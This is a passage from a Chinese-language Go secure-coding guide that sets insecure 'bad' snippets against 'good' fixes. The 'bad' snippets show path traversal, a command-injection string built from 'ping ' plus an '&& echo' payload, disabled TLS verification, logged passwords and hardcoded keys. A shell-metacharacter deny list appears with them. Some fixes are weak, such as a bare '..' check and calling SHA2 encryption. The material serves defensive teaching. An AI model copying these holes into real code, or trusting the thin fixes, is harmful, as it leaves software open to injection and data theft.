class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// [signal SIGSEGV: segmentation violation code=0x1 addr=0xc100068f55 pc=0x49142b]</span><br><br></code></pre></td></tr></table></figure><h4 id="1-1-9【推荐】不使用slice作为函数入参"><a href="#1-1-9【推荐】不使用slice作为函数入参" class="headerlink" title="1.1.9【推荐】不使用slice作为函数入参"></a>1.1.9【推荐】不使用slice作为函数入参</h4><ul><li>slice在作为函数入参时，函数内对slice的修改可能会影响原始数据</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-comment">// slice作为函数入参时包含原始数组指针</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">modify</span><span class="hljs-params">(array []<span class="hljs-type">int</span>)</span></span> &#123;<br>    array[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span> <span class="hljs-comment">// 对入参slice的元素修改会影响原始数据</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    array := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><br>    modify(array)<br>    fmt.Println(array) <span class="hljs-comment">// output：[10 2 3 4 5]</span><br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-comment">// 数组作为函数入参，而不是slice</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">modify</span><span class="hljs-params">(array [5]<span class="hljs-type">int</span>)</span></span> &#123;<br>  array[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 传入数组，注意数组与slice的区别</span><br>    array := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><br>    modify(array)<br>    fmt.Println(array)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1-2-文件操作"><a href="#1-2-文件操作" class="headerlink" title="1.2 文件操作"></a>1.2 文件操作</h3><h4 id="1-2-1【必须】-路径穿越检查"><a href="#1-2-1【必须】-路径穿越检查" class="headerlink" title="1.2.1【必须】 路径穿越检查"></a>1.2.1【必须】 路径穿越检查</h4><ul><li>在进行文件操作时，如果对外部传入的文件名未做限制，可能导致任意文件读取或者任意文件写入，严重可能导致代码执行。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad: 任意文件读取</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>path := r.URL.Query()[<span class="hljs-string">&quot;path&quot;</span>][<span class="hljs-number">0</span>]<br><br><span class="hljs-comment">// 未过滤文件路径，可能导致任意文件读取</span><br>data, _ := ioutil.ReadFile(path)<br>w.Write(data)<br><br><span class="hljs-comment">// 对外部传入的文件名变量，还需要验证是否存在../等路径穿越的文件名</span><br>data, _ = ioutil.ReadFile(filepath.Join(<span class="hljs-string">&quot;/home/user/&quot;</span>, path))<br>w.Write(data)<br>&#125;<br><br><span class="hljs-comment">// bad: 任意文件写入</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzip</span><span class="hljs-params">(f <span class="hljs-type">string</span>)</span></span> &#123;<br>r, _ := zip.OpenReader(f)<br><span class="hljs-keyword">for</span> _, f := <span class="hljs-keyword">range</span> r.File &#123;<br>p, _ := filepath.Abs(f.Name)<br><span class="hljs-comment">// 未验证压缩文件名，可能导致../等路径穿越，任意文件路径写入</span><br>ioutil.WriteFile(p, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;present&quot;</span>), <span class="hljs-number">0640</span>)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// good: 检查压缩的文件名是否包含..路径穿越特征字符，防止任意写入</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipGood</span><span class="hljs-params">(f <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>r, err := zip.OpenReader(f)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;read zip file fail&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><span class="hljs-keyword">for</span> _, f := <span class="hljs-keyword">range</span> r.File &#123;<br><span class="hljs-keyword">if</span> !strings.Contains(f.Name, <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>p, _ := filepath.Abs(f.Name)<br>ioutil.WriteFile(p, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;present&quot;</span>), <span class="hljs-number">0640</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-2-2【必须】-文件访问权限"><a href="#1-2-2【必须】-文件访问权限" class="headerlink" title="1.2.2【必须】 文件访问权限"></a>1.2.2【必须】 文件访问权限</h4><ul><li>根据创建文件的敏感性设置不同级别的访问权限，以防止敏感数据被任意权限用户读取。例如，设置文件权限为：<code>-rw-r-----</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">ioutil.WriteFile(p, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;present&quot;</span>), <span class="hljs-number">0640</span>)<br></code></pre></td></tr></table></figure><p><a id="1.1.3"></a></p><h3 id="1-3-系统接口"><a href="#1-3-系统接口" class="headerlink" title="1.3 系统接口"></a>1.3 系统接口</h3><p><strong>1.3.1【必须】命令执行检查</strong></p><ul><li>使用<code>exec.Command</code>、<code>exec.CommandContext</code>、<code>syscall.StartProcess</code>、<code>os.StartProcess</code>等函数时，第一个参数（path）直接取外部输入值时，应使用白名单限定可执行的命令范围，不允许传入<code>bash</code>、<code>cmd</code>、<code>sh</code>等命令；</li><li>使用<code>exec.Command</code>、<code>exec.CommandContext</code>等函数时，通过<code>bash</code>、<code>cmd</code>、<code>sh</code>等创建shell，-c后的参数（arg）拼接外部输入，应过滤\n  $  &amp;  ;  |  ‘  “  ( )  &#96;等潜在恶意字符；</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span> &#123;<br>userInputedVal := <span class="hljs-string">&quot;&amp;&amp; echo &#x27;hello&#x27;&quot;</span> <span class="hljs-comment">// 假设外部传入该变量值</span><br>cmdName := <span class="hljs-string">&quot;ping &quot;</span> + userInputedVal<br><br><span class="hljs-comment">// 未判断外部输入是否存在命令注入字符，结合sh可造成命令注入</span><br>cmd := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdName)<br>output, _ := cmd.CombinedOutput()<br>fmt.Println(<span class="hljs-type">string</span>(output))<br><br>cmdName := <span class="hljs-string">&quot;ls&quot;</span><br><span class="hljs-comment">// 未判断外部输入是否是预期命令</span><br>cmd := exec.Command(cmdName)<br>output, _ := cmd.CombinedOutput()<br>fmt.Println(<span class="hljs-type">string</span>(output))<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkIllegal</span><span class="hljs-params">(cmdName <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">if</span> strings.Contains(cmdName, <span class="hljs-string">&quot;&amp;&quot;</span>) || strings.Contains(cmdName, <span class="hljs-string">&quot;|&quot;</span>) || strings.Contains(cmdName, <span class="hljs-string">&quot;;&quot;</span>) ||<br>strings.Contains(cmdName, <span class="hljs-string">&quot;$&quot;</span>) || strings.Contains(cmdName, <span class="hljs-string">&quot;&#x27;&quot;</span>) || strings.Contains(cmdName, <span class="hljs-string">&quot;`&quot;</span>) ||<br>strings.Contains(cmdName, <span class="hljs-string">&quot;(&quot;</span>) || strings.Contains(cmdName, <span class="hljs-string">&quot;)&quot;</span>) || strings.Contains(cmdName, <span class="hljs-string">&quot;\&quot;&quot;</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>userInputedVal := <span class="hljs-string">&quot;&amp;&amp; echo &#x27;hello&#x27;&quot;</span><br>cmdName := <span class="hljs-string">&quot;ping &quot;</span> + userInputedVal<br><br><span class="hljs-keyword">if</span> checkIllegal(cmdName) &#123; <span class="hljs-comment">// 检查传给sh的命令是否有特殊字符</span><br><span class="hljs-keyword">return</span> <span class="hljs-comment">// 存在特殊字符直接return</span><br>&#125;<br><br>cmd := exec.Command(<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmdName)<br>output, _ := cmd.CombinedOutput()<br>fmt.Println(<span class="hljs-type">string</span>(output))<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-通信安全"><a href="#1-4-通信安全" class="headerlink" title="1.4 通信安全"></a>1.4 通信安全</h3><h4 id="1-4-1【必须】网络通信采用TLS方式"><a href="#1-4-1【必须】网络通信采用TLS方式" class="headerlink" title="1.4.1【必须】网络通信采用TLS方式"></a>1.4.1【必须】网络通信采用TLS方式</h4><ul><li>明文传输的通信协议目前已被验证存在较大安全风险，被中间人劫持后可能导致许多安全风险，因此必须采用至少TLS的安全通信方式保证通信安全，例如gRPC&#x2F;Websocket都使用TLS1.3。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;<br>w.Header().Add(<span class="hljs-string">&quot;Strict-Transport-Security&quot;</span>, <span class="hljs-string">&quot;max-age=63072000; includeSubDomains&quot;</span>)<br>w.Write([]<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;This is an example server.\n&quot;</span>))<br>&#125;)<br><br><span class="hljs-comment">// 服务器配置证书与私钥</span><br>log.Fatal(http.ListenAndServeTLS(<span class="hljs-string">&quot;:443&quot;</span>, <span class="hljs-string">&quot;yourCert.pem&quot;</span>, <span class="hljs-string">&quot;yourKey.pem&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-4-2【推荐】TLS启用证书验证"><a href="#1-4-2【推荐】TLS启用证书验证" class="headerlink" title="1.4.2【推荐】TLS启用证书验证"></a>1.4.2【推荐】TLS启用证书验证</h4><ul><li>TLS证书应当是有效的、未过期的，且配置正确的域名，生产环境的服务端应启用证书验证。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/tls&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doAuthReq</span><span class="hljs-params">(authReq *http.Request)</span></span> *http.Response &#123;<br>tr := &amp;http.Transport&#123;<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: <span class="hljs-literal">true</span>&#125;,<br>&#125;<br>client := &amp;http.Client&#123;Transport: tr&#125;<br>res, _ := client.Do(authReq)<br><span class="hljs-keyword">return</span> res<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/tls&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">doAuthReq</span><span class="hljs-params">(authReq *http.Request)</span></span> *http.Response &#123;<br>tr := &amp;http.Transport&#123;<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: <span class="hljs-literal">false</span>&#125;,<br>&#125;<br>client := &amp;http.Client&#123;Transport: tr&#125;<br>res, _ := client.Do(authReq)<br><span class="hljs-keyword">return</span> res<br>&#125;<br></code></pre></td></tr></table></figure><p><a id="1.1.5"></a></p><h3 id="1-5-敏感数据保护"><a href="#1-5-敏感数据保护" class="headerlink" title="1.5 敏感数据保护"></a>1.5 敏感数据保护</h3><h4 id="1-5-1【必须】敏感信息访问"><a href="#1-5-1【必须】敏感信息访问" class="headerlink" title="1.5.1【必须】敏感信息访问"></a>1.5.1【必须】敏感信息访问</h4><ul><li>禁止将敏感信息硬编码在程序中，既可能会将敏感信息暴露给攻击者，也会增加代码管理和维护的难度</li><li>使用配置中心系统统一托管密钥等敏感信息</li></ul><h4 id="1-5-2【必须】敏感数据输出"><a href="#1-5-2【必须】敏感数据输出" class="headerlink" title="1.5.2【必须】敏感数据输出"></a>1.5.2【必须】敏感数据输出</h4><ul><li>只输出必要的最小数据集，避免多余字段暴露引起敏感信息泄露</li><li>不能在日志保存密码（包括明文密码和密文密码）、密钥和其它敏感信息</li><li>对于必须输出的敏感信息，必须进行合理脱敏展示</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">serve</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>r.ParseForm()<br>user := r.Form.Get(<span class="hljs-string">&quot;user&quot;</span>)<br>pw := r.Form.Get(<span class="hljs-string">&quot;password&quot;</span>)<br><br>log.Printf(<span class="hljs-string">&quot;Registering new user %s with password %s.\n&quot;</span>, user, pw)<br>&#125;)<br>http.ListenAndServe(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br><br><span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">serve1</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>r.ParseForm()<br>user := r.Form.Get(<span class="hljs-string">&quot;user&quot;</span>)<br>pw := r.Form.Get(<span class="hljs-string">&quot;password&quot;</span>)<br><br>log.Printf(<span class="hljs-string">&quot;Registering new user %s.\n&quot;</span>, user)<br><br><span class="hljs-comment">// ...</span><br>use(pw)<br>&#125;)<br>http.ListenAndServe(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>避免通过GET方法、代码注释、自动填充、缓存等方式泄露敏感信息</li></ul><h4 id="1-5-3【必须】敏感数据存储"><a href="#1-5-3【必须】敏感数据存储" class="headerlink" title="1.5.3【必须】敏感数据存储"></a>1.5.3【必须】敏感数据存储</h4><ul><li>敏感数据应使用SHA2、RSA等算法进行加密存储</li><li>敏感数据应使用独立的存储层，并在访问层开启访问控制</li><li>包含敏感信息的临时文件或缓存一旦不再需要应立刻删除</li></ul><h4 id="1-5-4【必须】异常处理和日志记录"><a href="#1-5-4【必须】异常处理和日志记录" class="headerlink" title="1.5.4【必须】异常处理和日志记录"></a>1.5.4【必须】异常处理和日志记录</h4><ul><li>应合理使用panic、recover、defer处理系统异常，避免出错信息输出到前端</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> r := <span class="hljs-built_in">recover</span>(); r != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Recovered in start()&quot;</span>)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><ul><li>对外环境禁止开启debug模式，或将程序运行日志输出到前端</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">// bad<br>dlv --listen=:2345 --headless=<span class="hljs-literal">true</span> --api-version=2 debug test.go<br>// good<br>dlv debug test.go<br></code></pre></td></tr></table></figure><p><a id="1.1.6"></a></p><h3 id="1-6-加密解密"><a href="#1-6-加密解密" class="headerlink" title="1.6 加密解密"></a>1.6 加密解密</h3><h4 id="1-6-1【必须】不得硬编码密码-x2F-密钥"><a href="#1-6-1【必须】不得硬编码密码-x2F-密钥" class="headerlink" title="1.6.1【必须】不得硬编码密码&#x2F;密钥"></a>1.6.1【必须】不得硬编码密码&#x2F;密钥</h4><ul><li>在进行用户登陆，加解密算法等操作时，不得在代码里硬编码密钥或密码，可通过变换算法或者配置等方式设置密码或者密钥。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// bad</span><br><span class="hljs-keyword">const</span> (<br>user     = <span class="hljs-string">&quot;dbuser&quot;</span><br>password = <span class="hljs-string">&quot;s3cretp4ssword&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">connect</span><span class="hljs-params">()</span></span> *sql.DB &#123;<br>connStr := fmt.Sprintf(<span class="hljs-string">&quot;postgres://%s:%s@localhost/pqgotest&quot;</span>, user, password)<br>db, err := sql.Open(<span class="hljs-string">&quot;postgres&quot;</span>, connStr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> db<br>&#125;<br><br><span class="hljs-comment">// bad</span><br><span class="hljs-keyword">var</span> (<br>commonkey = []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;0123456789abcdef&quot;</span>)<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">AesEncrypt</span><span class="hljs-params">(plaintext <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>block, err := aes.NewCipher(commonkey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-6-2【必须】密钥存储安全"><a href="#1-6-2【必须】密钥存储安全" class="headerlink" title="1.6.2【必须】密钥存储安全"></a>1.6.2【必须】密钥存储安全</h4><ul><li>在使用对称密码算法时，需要保护好加密密钥。当算法涉及敏感、业务数据时，可通过非对称算法协商加密密钥。其他较为不敏感的数据加密，可以通过变换算法等方式保护密钥。</li></ul><h4 id="1-6-3【推荐】不使用弱密码算法"><a href="#1-6-3【推荐】不使用弱密码算法" class="headerlink" title="1.6.3【推荐】不使用弱密码算法"></a>1.6.3【推荐】不使用弱密码算法</h4><ul><li>在使用加密算法时，不建议使用加密强度较弱的算法。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> bad<br>crypto<span class="hljs-regexp">/des，crypto/m</span>d5，crypto<span class="hljs-regexp">/sha1，crypto/</span>rc4等。<br><br><span class="hljs-regexp">//</span> good<br>crypto<span class="hljs-regexp">/rsa，crypto/</span>aes等。<br></code></pre></td></tr></table></figure><h3 id="1-7-正则表达式"><a href="#1-7-正则表达式" class="headerlink" title="1.7 正则表达式"></a>1.7 正则表达式</h3><h4 id="1-7-1【推荐】使用regexp进行正则表达式匹配"><a href="#1-7-1【推荐】使用regexp进行正则表达式匹配" class="headerlink" title="1.7.1【推荐】使用regexp进行正则表达式匹配"></a>1.7.1【推荐】使用regexp进行正则表达式匹配</h4><ul><li>正则表达式编写不恰当可被用于DoS攻击，造成服务不可用，推荐使用regexp包进行正则表达式匹配。regexp保证了线性时间性能和优雅的失败：对解析器、编译器和执行引擎都进行了内存限制。但regexp不支持以下正则表达式特性，如业务依赖这些特性，则regexp不适合使用。<ul><li>回溯引用<a href="https://www.regular-expressions.info/backref.html">Backreferences</a></li><li>查看<a href="https://www.regular-expressions.info/lookaround.html">Lookaround</a></li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br>matched, err := regexp.MatchString(<span class="hljs-string">`a.b`</span>, <span class="hljs-string">&quot;aaxbb&quot;</span>)<br>fmt.Println(matched) <span class="hljs-comment">// true</span><br>fmt.Println(err)     <span class="hljs-comment">// nil</span><br></code></pre></td></tr></table></figure><h1 id="后台类"><a href="#后台类" class="headerlink" title="后台类"></a>后台类</h1><h2 id="1-代码实现类-1"><a href="#1-代码实现类-1" class="headerlink" title="1 代码实现类"></a>1 代码实现类</h2><h3 id="1-1-输入校验"><a href="#1-1-输入校验" class="headerlink" title="1.1 输入校验"></a>1.1 输入校验</h3><h4 id="1-1-1【必须】按类型进行数据校验"><a href="#1-1-1【必须】按类型进行数据校验" class="headerlink" title="1.1.1【必须】按类型进行数据校验"></a>1.1.1【必须】按类型进行数据校验</h4><ul><li>所有外部输入的参数，应使用<code>validator</code>进行白名单校验，校验内容包括但不限于数据长度、数据范围、数据类型与格式，校验不通过的应当拒绝</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// good</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/go-playground/validator/v10&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> validate *validator.Validate<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateVariable</span><span class="hljs-params">()</span></span> &#123;<br>myEmail := <span class="hljs-string">&quot;abc@tencent.com&quot;</span><br>errs := validate.Var(myEmail, <span class="hljs-string">&quot;required,email&quot;</span>)<br><span class="hljs-keyword">if</span> errs != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(errs)<br><span class="hljs-keyword">return</span><br><span class="hljs-comment">//停止执行</span><br>&#125;<br><span class="hljs-comment">// 验证通过，继续执行</span><br>...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>validate = validator.New()<br>validateVariable()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>无法通过白名单校验的应使用<code>html.EscapeString</code>、<code>text/template</code>或<code>bluemonday</code>对<code>&lt;, &gt;, &amp;, &#39;,&quot;</code>等字符进行过滤或编码</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;text/template&quot;</span><br>)<br><br><span class="hljs-comment">// TestHTMLEscapeString HTML特殊字符转义</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">(inputValue <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>escapedResult := template.HTMLEscapeString(inputValue)<br><span class="hljs-keyword">return</span> 